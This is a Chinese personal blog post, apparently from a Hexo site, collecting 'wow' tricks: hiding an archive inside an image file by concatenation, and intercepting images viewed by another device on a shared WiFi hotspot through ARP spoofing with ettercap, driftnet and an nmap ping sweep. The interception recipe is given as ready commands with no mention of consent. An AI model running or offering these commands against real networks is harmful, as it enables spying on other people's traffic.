@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ictar.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="收集看到的好玩的技巧~~  隐文术 如何将文件隐藏在一张图片中~~  Windows下  1. 首先，你要准备一张图片，假设图片名称为image.png  2. 把你要隐藏的文件压缩成rar，假设压缩后名称为mys.rar  3. cmd，输入命令：copy &#x2F;b image.png + mys.rar image2.png  4. 此时，会在当前目录下生成image2.png文件。打开可以看到此">
+<meta property="og:type" content="article">
+<meta property="og:title" content="那些令人wow的小技巧集锦">
+<meta property="og:url" content="http://ictar.github.io/2015/12/16/%E9%82%A3%E4%BA%9B%E4%BB%A4%E4%BA%BAwow%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6/index.html">
+<meta property="og:site_name" content="∞">
+<meta property="og:description" content="收集看到的好玩的技巧~~  隐文术 如何将文件隐藏在一张图片中~~  Windows下  1. 首先，你要准备一张图片，假设图片名称为image.png  2. 把你要隐藏的文件压缩成rar，假设压缩后名称为mys.rar  3. cmd，输入命令：copy &#x2F;b image.png + mys.rar image2.png  4. 此时，会在当前目录下生成image2.png文件。打开可以看到此">
+<meta property="og:locale">
+<meta property="article:published_time" content="2015-12-16T02:11:36.000Z">
+<meta property="article:modified_time" content="2020-12-25T08:20:40.990Z">
+<meta property="article:author" content="Ele">
+<meta property="article:tag" content="hack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://ictar.github.io/2015/12/16/%E9%82%A3%E4%BA%9B%E4%BB%A4%E4%BA%BAwow%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>那些令人wow的小技巧集锦 | ∞</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="∞" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">∞</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">好好学习，天天向上</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://ictar.github.io/2015/12/16/%E9%82%A3%E4%BA%9B%E4%BB%A4%E4%BA%BAwow%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ele">
+      <meta itemprop="description" content="Share life, share idea, share code.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="∞">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          那些令人wow的小技巧集锦
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2015-12-16 10:11:36" itemprop="dateCreated datePublished" datetime="2015-12-16T10:11:36+08:00">2015-12-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-12-25 16:20:40" itemprop="dateModified" datetime="2020-12-25T16:20:40+08:00">2020-12-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2015/12/16/%E9%82%A3%E4%BA%9B%E4%BB%A4%E4%BA%BAwow%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/12/16/那些令人wow的小技巧集锦/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>收集看到的好玩的技巧~~</p>
+<h1 id="隐文术">隐文术</h1>
+<p>如何将文件隐藏在一张图片中~~</p>
+<h2 id="windows下">Windows下</h2>
+<ol type="1">
+<li>首先，你要准备一张图片，假设图片名称为image.png</li>
+<li>把你要隐藏的文件压缩成rar，假设压缩后名称为mys.rar</li>
+<li>cmd，输入命令：<code>copy /b image.png + mys.rar image2.png</code></li>
+<li>此时，会在当前目录下生成image2.png文件。打开可以看到此文件跟image.png所展示的图片是一模一样的。给文件名加个后缀<code>.rar</code>，即修改为image2.png.rar。然后，你就可以看到前面的mys.rar文件了！！</li>
+</ol>
+<h2 id="linux下">Linux下</h2>
+<ol type="1">
+<li>首先，你要准备一张图片，假设图片名称为image.jpg</li>
+<li>把你要隐藏的文件压缩成zip，假设压缩后名称为mys.zip</li>
+<li>终端下，输入命令：<code>cat mys.zip &gt;&gt; image.jpg</code></li>
+<li>此时，看到此文件跟原image.png所展示的图片是一模一样的。给文件名加个后缀<code>.zip</code>，即修改为image.jpg.zip。然后，你就可以看到前面的mys.zip文件了！！</li>
+</ol>
+<h1 id="热点wifi下的照片拦截">热点WIFI下的照片拦截</h1>
+<h2 id="linux下-1">Linux下</h2>
+<ol type="1">
+<li>安装ARP欺骗工具ettercap: <code>apt-get install  ettercap-text-only</code></li>
+<li>安装driftnet（用于抓取指定接口数据流上面图片的软件并且吧嗅探到的图片友好的显示在一个窗口当中的工具）：<code>apt-get install driftnet</code></li>
+<li>进行欺骗： <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 192.168.1.101为目标IP，192.168.1.1为网关地址</span></span><br><span class="line"><span class="comment"># wlan0为自己电脑上的interface</span></span><br><span class="line">ettercap -i wlan0  -T -M arp:remote <span class="regexp">/192.168.1.1/</span> <span class="regexp">/192.168.1.101/</span></span><br></pre></td></tr></table></figure></li>
+<li>启动driftnet：<code>driftnet -i wlan0</code>。此时，会弹出一个黑色的小框框，将其放大。</li>
+<li>let's play~~ 目标IP浏览带有图片的网站时，所浏览的网站上的图片就会显示在上面的小框框中。</li>
+</ol>
+<p>注：目标IP可以通过神器nmap扫描：<code>nmap -sP 192.168.1.0/24</code>，获得同一个网段中的活跃主机</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>请言小午吃个甜筒~~</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Ele WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Ele Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/hack/" rel="tag"># hack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2015/12/15/%E5%A0%86%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%8F%8A%E5%85%B6Python%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/" rel="prev" title="堆、栈、队列及其Python的简单实现">
+      <i class="fa fa-chevron-left"></i> 堆、栈、队列及其Python的简单实现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2016/01/04/%E9%93%BE%E8%A1%A8%E5%8F%8A%E5%85%B6Python%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/" rel="next" title="链表及其Python的简单实现">
+      链表及其Python的简单实现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%90%E6%96%87%E6%9C%AF"><span class="nav-number">1.</span> <span class="nav-text">隐文术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows%E4%B8%8B"><span class="nav-number">1.1.</span> <span class="nav-text">Windows下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E4%B8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">Linux下</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%83%AD%E7%82%B9wifi%E4%B8%8B%E7%9A%84%E7%85%A7%E7%89%87%E6%8B%A6%E6%88%AA"><span class="nav-number">2.</span> <span class="nav-text">热点WIFI下的照片拦截</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E4%B8%8B-1"><span class="nav-number">2.1.</span> <span class="nav-text">Linux下</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ele</p>
+  <div class="site-description" itemprop="description">Share life, share idea, share code.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">97</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ictar" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ictar" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ele.qiong@gmail.com" title="E-Mail → mailto:ele.qiong@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5842594146" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5842594146" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2015 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ele</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ictargithub.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://ictar.github.io/2015/12/16/%E9%82%A3%E4%BA%9B%E4%BB%A4%E4%BA%BAwow%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6/";
+    this.page.identifier = "2015/12/16/那些令人wow的小技巧集锦/";
+    this.page.title = "那些令人wow的小技巧集锦";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://ictargithub.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+</html>
